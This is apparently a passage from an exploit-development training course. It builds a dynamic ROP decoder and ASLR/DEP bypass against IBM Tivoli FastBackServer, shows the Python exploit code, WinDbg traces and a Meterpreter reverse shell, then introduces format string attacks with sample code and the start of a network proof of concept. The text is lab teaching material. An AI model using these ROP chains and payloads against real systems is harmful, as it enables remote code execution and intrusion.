In the previous section, we developed an automated shellcode encoder by mapping and replacing bad characters. Now we can focus on the more complex decoding process. We'll need to build a decoding ROP chain to dynamically handle the bad characters found by mapBadChars.
Essentially, our code must be able to handle an arbitrary amount of bad characters and arbitrary offsets, as well as a shellcode of unknown size.
Let's tackle this task by breaking it down into smaller actions. First, we'll align EAX with the beginning of the shellcode. Next, we will perform a loop over each of the bad characters found by mapBadChars and add a sequence of ROP gadgets to fix it. Finally, we'll need to reset EAX to point back to the ROP skeleton.
In the previous proof of concept, we aligned EAX by popping a negative value into ECX and subtracting it from EAX. We can reuse this same technique, but this time the subtraction of the value will point EAX to one byte before the start of the encoded shellcode. This way, our algorithm will be able to handle shellcode with a bad character as the first byte.
The value we subtracted from EAX in the last section was 0xfffff9e2, and the first bad character was at offset 3 into the shellcode. That means we must subtract an additional 3 bytes, or 0xfffff9e5, to align EAX with the beginning of the shellcode.
The updated alignment ROP chain is shown in Listing 82.
# Align EAX with shellcode
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xfffff9e5))	
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
Listing 82 - Aligning EAX with one byte prior to shellcode
Now that we have aligned EAX with the beginning of the shellcode, we need to create a method that dynamically adds a ROP chain for each bad character.
The generic ROP chain prototype is shown in Listing 83.
rop += pack("<L", (dllBase + 0x117c))               # pop ecx ; ret
rop += pack("<L", (offset to next bad characters))
rop += pack("<L", (dllBase + 0x4a7b6))              # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (value to add))                   # values in BH
rop += pack("<L", (dllBase + 0x468ee))              # add [eax+1], bh ; ret
Listing 83 - Generic ROP chain to fix a single bad character
For each of these ROP chains, our code must calculate the offset from the previous bad character to the next. It must also ensure that the offset is popped into ECX, as highlighted in the listing above ("offset to next bad characters").
Because the value is subtracted from EAX, we'll need to use its negative counterpart.
We also need to add a value to the replacement character to restore the original bad character. We'll place this value into the second highlighted section from Listing 83. We must keep in mind that the value popped in EBX cannot contain a bad character, and only the byte in BH is used in the restore action.
Let's start developing the decoding scheme.
By performing the simple math shown in Listing 84, we obtain usable values for our decoding scheme.
0x01 + 0xff = 0x00
0xf9 + 0x10 = 0x09
0x04 + 0x06 = 0x0a
0x04 + 0x07 = 0x0b
0x04 + 0x08 = 0x0c
0x08 + 0x05 = 0x0d
0x01 + 0x1f = 0x20
Listing 84 - Values to add to restore original characters
Next we'll create the decodeShellcode method, which will use the values shown above to generate the ROP chain to decode the shellcode.
decodeShellcode will require three arguments; the base address of libeay32IBM019, the indexes of the bad characters in the shellcode, and the unencoded shellcode.
The code for decodeShellcode is shown in Listing 85.
def decodeShellcode(dllBase, badIndex, shellcode):
	BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
	CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
	restoreRop = b""
	for i in range(len(badIndex)):
		if i == 0:
			offset = badIndex[i]
		else:
			offset = badIndex[i] - badIndex[i-1]
		neg_offset = (-offset) & 0xffffffff
		value = 0
		for j in range(len(BADCHARS)):
			if shellcode[badIndex[i]] == BADCHARS[j]:
				value = CHARSTOADD[j]
		value = (value << 8) | 0x11110011

		restoreRop += pack("<L", (dllBase + 0x117c))    # pop ecx ; ret
		restoreRop += pack("<L", (neg_offset))
		restoreRop += pack("<L", (dllBase + 0x4a7b6))	# sub eax, ecx ; pop ebx ; ret
		restoreRop += pack("<L", (value))               # values in BH
		restoreRop += pack("<L", (dllBase + 0x468ee))   # add [eax+1], bh ; ret
	return restoreRop
Listing 85 - Method to decode shellcode with ROP
First we'll list the possible bad characters and the associated characters we want to add. Next, we can create an accumulator variable (restoreRop) that will contain the entire decoding ROP chain.
Next, we need to perform a loop over all the bad character indexes. For each entry, we'll calculate the offset from the previous bad character to the current bad character. This offset is negated and assigned to the neg_offset variable and used in the ROP chain for the POP ECX instruction.
To determine the value to add to the replacement character, we can perform a nested loop over all possible bad characters to determine which one was present at the corresponding index. Once the value is found, it is stored in the value variable.
Since the contents of value must be popped into BH, we have to left-shift it by 8 bits. This will produce a value that is aligned with the BH register but contains NULL bytes. To solve the NULL byte problem, we will perform an OR operation with the static value 0x11110011.
Finally, the result is written to the ROP chain where it will be popped into EBX at runtime.
This complex process enables us to perform custom encoding that avoids bad characters during network packet processing. This process also allows us to decode the shellcode before it is copied to the non-writable code cave.
To use decodeShellcode, we'll call it just after the ROP chain that aligns EAX with the beginning of the shellcode.
# Align EAX with shellcode  
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xfffff9e5))	
rop += pack("<L", (dllBase + 0x4a7b6)) # sub eax, ecx ; pop ebx ; ret
rop += pack("<L", (0x42424242)) # junk into eb

rop += decodeShellcode(dllBase, pos, shellcode)

# Align ESP with ROP Skeleton
rop += pack("<L", (dllBase + 0x117c)) # pop ecx ; ret
rop += pack("<L", (0xffffffec)) # -14
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret

offset2 = b"C" * (0x600 - len(rop))
padding = b"D" * (0x1000 - 276 - 4 - len(rop) - len(offset2) - len(encodedShellcode))

formatString = b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (offset+wpm+eip+rop+offset2+encodedShellcode+padding,0,0,0,0)
buf += formatString
Listing 86 - Calling decodeShellcode
With the proof of concept updated, let's restart FastBackServer, attach WinDbg, and set a breakpoint on the ROP gadget where EAX is aligned with the shellcode. When the exploit is executed, we can verify our decoder in WinDbg:
0:078> bp libeay32IBM019+0x4a7b6
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\ibm\gsk8\lib\N\icc\osslib\libeay32IBM019.dll - 

0:078> g
Breakpoint 0 hit
eax=149de300 ebx=0605be40 ecx=fffff9e5 edx=77251670 esi=42424242 edi=00669360
eip=0325a7b6 esp=149de3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_BIO_f_cipher+0x386:
0325a7b6 2bc1            sub     eax,ecx

0:098> p
eax=149de91b ebx=0605be40 ecx=fffff9e5 edx=77251670 esi=42424242 edi=00669360
eip=0325a7b8 esp=149de3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_BIO_f_cipher+0x388:
0325a7b8 5b              pop     ebx

0:098> db eax L10
149de91b  43 fc e8 82 ff ff ff 60-89 e5 31 c0 64 8b 50 30  C......`..1.d.P0

0:098> g
Breakpoint 0 hit
eax=149de91b ebx=42424242 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
eip=0325a7b6 esp=149de3bc ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_BIO_f_cipher+0x386:
0325a7b6 2bc1            sub     eax,ecx

0:098> p
eax=149de91e ebx=42424242 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
eip=0325a7b8 esp=149de3bc ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_BIO_f_cipher+0x388:
0325a7b8 5b              pop     ebx

0:098> db eax L10
149de91e  82 ff ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R.
Listing 87 - Alignment of the decoder
Listing 87 shows that the first time the breakpoint is hit, EAX is aligned with the beginning of the shellcode (minus one byte, to account for the offset in the write gadget).
The second time the breakpoint is triggered, EAX becomes aligned with the first replacement character. At this point, we can step through the decoding routine and restore the bad character in the shellcode.
0:098> p
eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
eip=0325a7b9 esp=149de3c0 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_BIO_f_cipher+0x389:
0325a7b9 c3              ret

0:098> p
eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
eip=032568ee esp=149de3c4 ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x1e:
032568ee 00b801000000    add     byte ptr [eax+1],bh        ds:0023:149de91f=ff

0:098> p
eax=149de91e ebx=11110111 ecx=fffffffd edx=77251670 esi=42424242 edi=00669360
eip=032568f4 esp=149de3c4 ebp=41414141 iopl=0         nv up ei pl zr ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000257
libeay32IBM019!N98E_EVP_CIPHER_CTX_set_padding+0x24:
032568f4 c3              ret

0:098> db eax L10
149de91e  82 00 ff ff 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R.
Listing 88 - Dynamic ROP chain to fix a bad character
In Listing 88, we stepped through the decoding routine for the first bad character and found that the ROP chain restored it correctly.
Let's allow execution to continue, triggering the breakpoint an additional two times. We can then check the contents of the shellcode after executing the decoding routine against two more bad characters:
0:000> db 149de91e L10
149de91e  82 00 00 00 60 89 e5 31-c0 64 8b 50 30 8b 52 08  ....`..1.d.P0.R.
Listing 89 - Dynamic ROP chain has fixed 3 bad characters
These results confirm that our process is working, since our exploit has dynamically detected the three bad characters, replaced them, and generated the required ROP decoder.
We're now ready to replace the truncated shellcode with our complete shellcode. Our exploit will dynamically encode and decode the shellcode to avoid bad characters and decode the payload in the non-writable code cave.
Our exploit can decode the shellcode, but we are still missing a final step. We need to restore EAX to the start of the ROP skeleton before we execute the XCHG ROP gadget.
If we restart FastBackServer, attach WinDbg, and set a breakpoint on the gadget that aligns EAX with the shellcode (libeay32IBM019+0x4a7b6), we can find the distance from the ROP skeleton to EAX, as shown in Listing 90.
eax=110ae91b ebx=0612aad8 ecx=fffff9e5 edx=76fd1670 esi=42424242 edi=00669360
eip=0327a7b8 esp=110ae3ac ebp=41414141 iopl=0         nv up ei pl nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
libeay32IBM019!N98E_BIO_f_cipher+0x388:
0327a7b8 5b              pop     ebx

0:084> dd eax-62f L7
110ae2ec  75342890 032c2c04 ffffffff 032c2c04
110ae2fc  110ae91c 0000020c 0331401c 
Listing 90 - Finding offset from shellcode to ROP skeleton
Through trial and error, we discover that the difference from EAX to the start of the ROP skeleton is 0x62f.
We can add this value to the index of the last bad character to dynamically determine the distance from EAX when the ROP chain completes the decoding process.
The updated ROP chain segment in Listing 91 calculates the required offset.
# Align ESP with ROP Skeleton
skeletonOffset = (-(pos[len(pos)-1] + 0x62f)) & 0xffffffff
rop += pack("<L", (dllBase + 0x117c))  # pop ecx ; ret
rop += pack("<L", (skeletonOffset))    # dynamic offset
rop += pack("<L", (dllBase + 0x1d0f0)) # add eax, ecx ; ret
rop += pack("<L", (dllBase + 0x5b415)) # xchg eax, esp ; ret
Listing 91 - ROP chain to align EAX with ROP skeleton
The offset stored in the skeletonOffset variable is found from the last entry of the array of indexes associated with the bad characters.
To verify that the dynamically-found offset is correct, let's restart FastBackServer, attach WinDbg, and set a breakpoint on the "XCHG EAX, ESP" ROP gadget. Then, we'll run the updated exploit.
0:084> bp libeay32IBM019+0x5b415

0:084> g
Breakpoint 0 hit
eax=110ae2ec ebx=11110111 ecx=fffff76c edx=76fd1670 esi=42424242 edi=00669360
eip=0328b415 esp=110ae744 ebp=41414141 iopl=0         nv up ei pl nz na po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000203
libeay32IBM019!N98E_a2i_ASN1_INTEGER+0x85:
0328b415 94              xchg    eax,esp

0:084> dd eax L7
110ae2ec  75342890 032c2c04 ffffffff 032c2c04
110ae2fc  110ae91c 0000020c 0331401c 
Listing 92 - Correctly aligned EAX
We find that EAX has been correctly realigned with the address for WriteProcessMemory, which is stored on the stack.
Once EAX is aligned with the ROP skeleton and the XCHG ROP gadget is executed, our exploit has performed all the steps required to execute WriteProcessMemory and copy the decoded shellcode into the code cave.
As a final proof that the exploit works, we can set up a Metasploit multi/handler and execute our exploit without WinDbg attached.
msf5 exploit(multi/handler) > exploit

[*] Started HTTP reverse handler on http://192.168.119.120:8080
[*] http://192.168.119.120:8080 handling request from 192.168.120.10; (UUID: zj3o53wp) Staging x86 payload (181337 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.120:8080 -> 192.168.120.10:53328)

meterpreter > 
Listing 93 - Getting a reverse shell from FastBackServer with ASLR enabled
Excellent! We have bypassed both ASLR and DEP, dynamically encoded and decoded our shellcode with ROP, and obtained a reverse shell.
Our encoding and decoding technique is now fully-automated and dynamic, making it easy to replace our shellcode in the future.
Exercises
1.	Implement decodeShellcode to dynamically create the decoding ROP chain and ensure that it works.
2.	Dynamically align EAX prior to executing the "XCHG EAX, ESP" gadget so that execution returns into WriteProcessMemory.
3.	Combine all the pieces in this module to obtain a reverse shell while bypassing both ALSR and DEP.
Extra Mile
Create an exploit that resolves VirtualProtect instead of WriteProcessMemory through the FXCLI_DebugDispatch function. Then build a ROP chain to achieve code execution while bypassing both ASLR and DEP.
Extra Mile
Since the FastBackServer process is automatically restarted if it crashes, we may opt to bypass ASLR through brute force rather than a leak.
Create an exploit that will attempt to brute force ASLR instead of using the leak. Perform a calculation to show how long it will take to perform an exploitation with a greater than 50% chance.
Extra Mile
Instead of using a shellcode decoding routine written in ROP, develop a custom reverse shellcode in assembly that does not contain any of the bad characters associated with the memory corruption vulnerability exploited in this module.
Extra Mile
In the C:\tools\aslr folder of the Windows 10 machine, you'll find an application called customsvr01.exe.
This application is compiled with DEP and ASLR. Reverse engineer it and find a vulnerability that will allow you to bypass ASLR. Next, find and exploit a memory corruption vulnerability in the same application to achieve code execution.
10.5. Wrapping Up
ASLR and DEP work together to form a strong defense, requiring us to leverage multiple vulnerabilities to craft a stable exploit.
In this module, we located a logical vulnerability that we used to develop an ASLR bypass by resolving arbitrary functions. We then crafted a ROP chain to call WriteProcessMemory and copy our shellcode into an executable memory page of libeay32IBM019.dll, bypassing DEP. Along the way, we managed bad characters in the shellcode by developing a dynamic encoding scheme and a ROP chain for runtime decoding.
Putting these pieces together, we overcame the operating system's ASLR and DEP defense mechanisms to obtain a reverse shell. 
11. Format String Specifier Attack Part I
In previous modules, we leveraged memory corruption vulnerabilities that manifested themselves as stack buffer overflows by using various functions with unsanitized arguments. We have more vulnerabilities to discover, however.
In this module, we will investigate a different type of vulnerability called format string specifier bug.1
We are going to leverage a format string specifier bug to bypass Address Space Layout Randomization (ASLR). Due to the nature of this vulnerability and logic involved, we will need to cover more theory and perform additional reverse engineering.
In the previous modules of this course, we developed exploits that obtained code execution by overwriting a large amount of data on the stack and bypassed ASLR by abusing insecure logic.
With the vulnerability in this module, we will take a more advanced approach and develop a so-called read primitive. At a high-level, a read primitive is a part of the exploit that allows us to leak or read semi-arbitrary memory. The amount of work and attention to detail we have to put in is greater, but we will be rewarded with a powerful way to bypass ASLR.
1 (OWASP, 2020), https://owasp.org/www-community/attacks/Format_string_attack
11.1. Format String Attacks
Since this is a different type of vulnerability, we have to cover some theory about format strings and format string specifiers, as well as how these can be abused to create an exploit to bypass a mitigation like ASLR.
11.1.1. Format String Theory
The concept of format strings is found in many programming languages that allow dynamic processing and presentation of content in strings.
This concept consists of two elements. The first is the format string and the other is a format function that parses the format string and outputs the final product.
There are multiple format string functions. Some examples in C++ are printf,1 sprintf,2 and vsnprintf.3 The major differences between these functions are in the way arguments are supplied and how the output string is returned.
The simplest format string function is printf, which has the prototype shown in Listing 1.
int printf(
 const char *format [,
 argument]...
);
Listing 1 - Function prototype of printf
The first argument, *format, is a pointer to the format string that determines how the content of the subsequent arguments are interpreted.
This interpretation is done according to the format specifiers present in the format string. Format specifiers are processed from left to right in the format string, and the format string function performs the specified formatting on the associated arguments.
Format specifiers are used to translate data into a specific format such as hex, decimal, or ASCII, as well as to configure their appearance in the final string.
To better understand format specifiers, we must investigate their syntax, which is presented in Listing 2.4
%[flags][width][.precision][size]type
Listing 2 - Format string syntax
Format specifiers start with the symbol % followed by flags, width, precision, and size, which all reflect the look, size, and amount of output. They are all optional.
Type is mandatory, and there are several types to choose from.5 Examples of most common type specifiers are given in Listing 3.
Type - Argument    -    Output format
x      Integer          Unsigned hexadecimal integer
i      Integer          Unsigned decimal integer
e      Floating-point   Signed value that has the form [ - ]d.dddd e [sign]dd
s      String           Specifies a character string up to the first null character
n      Pointer          Number of characters that are successfully written so far
Listing 3 - Common type specifiers
As an example, Listing 4 shows a simple format string that has the two type specifiers "x" and "s".
"This is a value in hex %x and a string %s"
Listing 4 - Format string example
When this format string is used with a format string function like printf, the first format specifier will be replaced with the content of the second argument and interpreted as a hex value. The second format specifier will be replaced with the third argument and interpreted as a string.
Listing 5 shows how the arguments 4660 and "I love cats!" are supplied to printf and the resulting string.
printf("This is a value in hex: %x and a string: %s", 4660, "I love cats!")
Output:
This is a value in hex: 0x1234 and a string: I love cats!
Listing 5 - Using a format string
The number of format specifiers should match the number of arguments. If there are more arguments than format string specifiers, they are left unused. But if there are more format string specifiers than arguments, security issues arise.
Most format functions work similarly, but arguments can be supplied from an array instead of individually.
This section has provided us with the basic knowledge about how format specifiers, format strings, and format functions work. Next, we'll discuss how they can be abused.
1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/printf/
2 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/sprintf/
3 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/
4 (Microsoft, 2019), https://docs.microsoft.com/en-us/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=msvc-160
5 (MSDN, 2015), https://msdn.microsoft.com/en-us/library/hf4y5e3w.aspx
11.1.2. Exploiting Format String Specifiers
As mentioned in the last section, if the number of format string specifiers is larger than the number of arguments, security vulnerabilities can arise. In this section, we are going to look into how this happens through small custom C++ applications.
Listing 6 shows C++ code that calls the printf function with a format string containing four format specifiers.
#include "pch.h"
#include <iostream>
#include <Windows.h>

int main(int argc, char **argv)
{
	printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66, 67, 68);
	return 0;
}
Listing 6 - C++ code calling printf with matching amount of arguments
When the code is compiled and executed, the application will print the format string with the four decimal values converted to hexadecimal values and replace the format specifiers.
In C:\Tools\format, we can find a compiled version of the application that produces the output displayed in Listing 7.
C:\Tools\format> FormatTest1.exe
This is your input: 0x41, 0x42, 0x43, 0x44
Listing 7 - Executing the proof of concept prints four hexadecimal values
As shown in the output from the application, the four numbers are converted and inserted correctly. This is correct usage of format strings and no vulnerability is present.
In Listing 8, we find a modified version of the previous code. The number of arguments supplied to the format string has been reduced from four to two, while the format string contains the same number of specifiers as before.
#include "pch.h"
#include <iostream>
#include <Windows.h>

int main(int argc, char **argv)
{
	printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66);
	return 0;
}
Listing 8 - C++ code calling printf with to few arguments
This leaves us wondering what values printf will print to the console when it executes.
To find out, let's execute a compiled version of the application from C:\Tools\format. on the Windows 10 client machine. We should obtain the output shown below.
C:\Tools\format> FormatTest2.exe
This is your input: 0x41, 0x42, 0x2e1022, 0x1afdc4
Listing 9 - Executing the updated proof of concept
The output in Listing 9 shows the decimal values 65 and 66 were converted to hexadecimal, as before. The last two highlighted values stem from the missing arguments. Both seem similar to memory addresses.
We'll recall from previous modules that in the __stdcall calling convention, arguments are passed to functions on the stack. In our current case, printf expects five arguments; the format string and four values according to the format string specifiers.
When printf is executed, it uses the format string and the two supplied decimal values. For the two remaining format specifiers, the two values that happen to be on the stack will be used.
If the values happen to be addresses inside a module or stack addresses, we may be able to leverage this into an ASLR bypass.
To verify this theory, let's modify the C++ code to enable us to inspect relevant memory in WinDbg. The updated code is shown in Listing 10.
#include "pch.h"
#include <iostream>
#include <Windows.h>

int main(int argc, char **argv)
{
	std::cout << "Press ENTER to start...\n";
	std::cin.get();
	
	printf("This is your input: 0x%x, 0x%x, 0x%x, 0x%x\n", 65, 66);

	DebugBreak();
	
	return 0;
}
Listing 10 - C++ code calling printf while being debugged
We'll observe two changes. First, the application will pause and wait for us to press any key before executing. This will allow us to attach WinDbg to the process before printf is called.
The second change is a call to the DebugBreak1 function. This call will execute an INT3 instruction that WinDbg catches, enabling us to inspect the memory of the application.
Let's run the modified application and attach WinDbg when prompted, pressing any key afterwards to resume. This will execute printf, then break into the execution flow.
C:\Tools\format> FormatTest3.exe
Press ENTER to start...

This is your input: 0x41, 0x42, 0xfcfeb0, 0x2e5658
Listing 11 - Executing the updated PoC with debugger attached
Switching to WinDbg, we can list the stack boundaries as highlighted in Listing 12 to check if the first highlighted value printed in Listing 11 is indeed a stack address.
(e7c.144): Break instruction exception - code 80000003 (first chance)
*** WARNING: Unable to verify checksum for C:\Tools\format\FormatTest3.exe
*** ERROR: Module load completed but symbols could not be loaded for C:\Tools\format\FormatTest3.exe
eax=00000011 ebx=011c1000 ecx=002e9ebf edx=00000030 esi=0031291c edi=012344b0
eip=753b1072 esp=00fcfe64 ebp=00fcfe68 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
KERNELBASE!wil::details::DebugBreak+0x2:
753b1072 cc              int     3

0:000> !teb
TEB at 011c2000
    ExceptionList:        00fcfea0
    StackBase:            00fd0000
    StackLimit:           00fcd000
    SubSystemTib:         00000000
    FiberData:            00001e00
...
Listing 12 - Inspecting first value in WinDbg
Clearly, printf printed a stack address to the console due to a missing argument.
We can similarly unassemble memory at the second printed value from Listing 11.
0:000> u 0x2e5658 L2
FormatTest3+0x5658:
002e5658 83c40c          add     esp,0Ch
002e565b 8bf0            mov     esi,eax

0:000> !vprot 0x2e5658
BaseAddress:       002e5000
AllocationBase:    002e0000
AllocationProtect: 00000080  PAGE_EXECUTE_WRITECOPY
RegionSize:        0001c000
State:             00001000  MEM_COMMIT
Protect:           00000020  PAGE_EXECUTE_READ
Type:              01000000  MEM_IMAGE
Listing 13 - Inspecting second value in WinDbg
In this case, the value is an address inside the code section of FormatTest3. We can use !vprot to determine that it is executable.
At this point, we've leveraged a vulnerable format string used in an application to discover both a stack address and an address inside the main executable. We may be able to use these addresses to bypass ASLR and subsequently DEP.
This is a simple example of how we could exploit format strings, however, it relies on a programming error that we're unlikely to find in a real-world scenario.
There are two important items to note here. First, the content printed by printf depends on what happens to be on the stack, so its reliability can vary. Second, to actively exploit a format string vulnerability in a real application, we'll need to influence either the format string itself or the number of arguments.
Let's use what we've learned about format string vulnerabilities to practice bypassing ASLR in the following sections.
Exercise
1.	Use the applications FormatTest1.exe, FormatTest2.exe, and FormatTest3.exe, located on the Windows 10 machine in the folder C:\Tools\FormatString, to repeat the analysis presented here.
1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-debugbreak
11.2. Attacking IBM Tivoli FastBackServer
Let's revisit IBM Tivoli FastBackServer since it contains multiple format string specifier bugs, some of which may be leveraged to bypass ASLR.
Searching online for format string specifier bugs in the application, we discover multiple vulnerabilities, but no proofs of concept.
One interesting advisory comes from Zero Day Initiative (ZDI). It mentions a vulnerable function named _EventLog.1 The public vulnerability report has a few technical details, but they are aimed at a different network port than the one we previously used.
In the next few sections, we will investigate whether the EventLog function contains a format string specifier vulnerability we can exploit, and whether we can trigger it from the previously-used network port.
1 (Zero Day Initiative, 2010), https://www.zerodayinitiative.com/advisories/ZDI-10-185/

11.2.1. Investigating the EventLog Function
Next, we'll locate the EventLog function and determine if it contains any vulnerable format string function calls. We also need to determine how to trigger such a vulnerability remotely.
We know from previous modules that the FXCLI_OraBR_Exec_Command function contains a multitude of branches, which in turn contain several vulnerabilities. We could spend time reverse engineering each branch to locate possible vulnerabilities, but for the sake of efficiency, in this module we are going to begin our analysis from the "_EventLog" function name.
Since we're beginning our analysis with only a function name, we will likely gain the fastest insight through static analysis.
Let's open our previously-analyzed FastBackServer executable in IDA Pro and search for any function called "_EventLog" using Jump > Jump to function... and use the quick filter option.
Fortunately, we only get two results, as shown in Figure 1 - one of which is an exact match.
 
Figure 1: Search results for _EventLog
Following the highlighted function, we first encounter a couple of checks, after which we locate the basic block shown in Figure 2.
 
Figure 2: Basic block with call to _ml_vsnprintf
The _ml_vsnprintf function is a trampoline into __vsnprintf, which turns out to be a massive function. Given the names of the functions, we can assume that this is an embedded implementation of the vsnprintf1 format string function.
The function prototype of vsnprintf, which is shown in Listing 14, lists four arguments with similar names to those identified by IDA Pro.
int vsnprintf(
  char *s,
  size_t n,
  const char *format,
  va_list arg
);
Listing 14 - Function prototype for vsnprintf
The vsnprintf function is a bit more complicated than printf. Instead of printing the content to the console, the formatted string is stored in the buffer that is passed as the first argument (*s).
The second argument (n) is the maximum number of bytes of the formatted string; if the formatted string is longer than this value, it will be truncated. The third argument (*format) is the format string itself, and the fourth argument (arg) is a pointer to an array containing the arguments for the format string specifiers.
From an attacker's perspective, the differences between printf and vsnprintf are important, but we can nevertheless exploit this function under the right circumstances.
 
Figure 3: Basic block with call to _ml_vsnprintf
As IDA Pro shows, _ml_vsnprintf accepts four arguments. The second argument, labeled "Count", contains the static value 0x400. This will limit the output size of any attack we perform.
The three remaining arguments are all passed to _EventLog as dynamic values, and thus may be under our control.
The most important argument for us to focus on is the format string itself, which may either be modified by us or passed as a static string containing many format specifiers.
Dynamically modifying the format string in an unintended way is more likely to escape the review of a developer. If we can locate a code path that will allow us to execute a format string function where the resultant formatted string is used as a format string for a second format string function, we may be able to obtain a dynamically-created format string.
For example, let's suppose _ml_vsnprintf is called with a format string containing a string format specifier ("%s"), and we control the arguments for it. In this case, we could provide the string "%x%x%x%x" as an argument, which would create a new format string as illustrated in Listing 15.
Before _ml_vsnprintf:
"This is my string: %s"

After _ml_vsnprintf:
"This is my string: %x%x%x%x"
Listing 15 - Creating a format string
If the formatted string following the call to _ml_vsnprintf is reused as a format string in a subsequent format string function, we may be able to recreate the vulnerable condition we observed in the initial printf example.
The vulnerable condition would happen if we could dynamically modify the format string to contain an arbitrary number of format specifiers. If we can find a location where the string formatted by _ml_vsnprintf is reused, we may be able to discover a vulnerability.
Before we go into further details on the located call to _ml_vsnprintf, let's search for a subsequent format string function that may reuse the output string.
Following the call to _ml_vsnprintf inside _EventLog, we can move down a couple of basic blocks and find two code paths that both invoke the _EventLog_wrapted function. One of these code blocks is displayed in Figure 4.
 
Figure 4: Call to _EventLog_wrapted
While we don't yet know what this function does, the automatic comment given to the third argument ("Format") is intriguing.
For a vulnerability to exist, _EventLog_wrapted must call a format string function with our resulting format string containing an arbitrary number of format specifiers. Since we'll be dealing with many dependencies and basic blocks, let's take advantage of some dynamic analysis.
We'll need to ensure that the first format string supplied to _EventLog and used by _ml_vsnprintf contains at least one string format specifier. A string format specifier is required for us to generate an arbitrary string, which is used in the subsequent format string function inside _EventLog_wrapted.
There are a lot of details to manage, so we will split up the work.
In the next section, we will learn how to invoke _EventLog with a supplied format string. Then we will analyze how _EventLog_wrapted uses a dynamically-created format string.
Exercise
1.	Use IDA Pro to locate the _EventLog function and ensure you understand the arguments it accepts.
1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/
11.2.2. Reverse Engineering a Path
In this section, we'll find a way to reach the _EventLog function by sending a network packet. The format string supplied to _EventLog must also contain a string format specifier.
Having worked with this application in previous modules, we know that the FXCLI_OraBR_Exec_Command function contains many different code paths to choose from. We need to find one that fulfills our requirements and then create a proof of concept that triggers it.
We can perform a cross-reference on _EventLog to find that it is called from 7496 places. There are two ways of solving this, either manually or through automation.
In the paid version of IDA Pro it's possible to leverage the embedded Python scripting library called IDAPython1 through a custom script like idapathfinder.2
Unfortunately, the IDAPython library is not accessible in free version of IDA Pro. Instead, we would have to reverse engineer each path that FXCLI_OraBR_Exec_Command takes to look for a call to _EventLog. Such a path must also provide an exploitable format string.
Because this task can be quite time consuming, we'll move directly to the match that we found for this course. The code path from FXCLI_OraBR_Exec_Command to _EventLog through the AGI_S_GetAgentSignature function allows us to trigger _EventLog from a network packet and is the one we choose.
There are two reasons for choosing this path. First, it only contains one nested function, and second, the format string supplied to _EventLog by AGI_S_GetAgentSignature contains a string specifier.
The interesting call inside AGI_S_GetAgentSignature is shown in Figure 5.
 
Figure 5: Call to _EventLog from AGI_S_GetAgentSignature
The format string is truncated in the basic block, but we can jump to the address of the variable containing it to inspect the full string, as displayed in Figure 6.
 
Figure 6: Full format string
In theory, we have found an ideal code path for our exploit. Next, we need to write a proof of concept that forces this path to be taken.
We can reuse our code framework from previous modules, but we need to locate the opcode for AGI_S_GetAgentSignature. We'll perform a cross-reference and find that it is only called by FXCLI_OraBR_Exec_Command.
Once we reach the call into AGI_S_GetAgentSignature and go one basic block backward, we find the comparison shown in Figure 7.
 
Figure 7: Opcode 0x604 to trigger AGI_S_GetAgentSignature
From previous modules, we know that the value at offset var_61B30 is the opcode. This provides us with the opcode value 0x604 and we can create the initial proof of concept as given in Listing 16.
import socket
import sys
from struct import pack

def main():
	if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = 11460
	
	# psAgentCommand
	buf = pack(">i", 0x400)
	buf += bytearray([0x41]*0xC)
	buf += pack("<i", 0x604)  # opcode
